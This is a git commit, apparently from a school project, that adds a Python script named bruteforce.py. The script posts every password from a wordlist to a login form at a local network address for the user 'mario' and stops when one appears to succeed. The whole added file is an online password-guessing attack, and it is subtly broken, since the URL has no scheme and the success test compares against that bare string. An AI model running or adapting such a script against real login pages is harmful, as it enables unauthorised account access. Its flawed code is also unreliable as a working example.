004a4873134934ef7aa44f5350b7246a4c42c5a6
filippoferrando <filippo.ferrando@itiscuneo.eu>
2022-03-03 09:26:02 +0100

    update

---
+++ webserver/bruteforce.py
@@ -0,0 +1,20 @@
+import requests
+
+
+url = "192.168.0.124:5000"
+wl = "wordlist.txt"
+
+lst = open(wl, "r")
+
+for line in lst.readlines():
+    password = line.strip()
+    #print(password)
+    http = requests.post(url, 
+    data={'username' : 'mario', 'password' : password, 
+    'login' : 'submit'})
+    content = http.content
+    if http.url == url:
+        print('Password incorrect : ', password)
+    else:
+        print('Password correct : ', password)
+        break
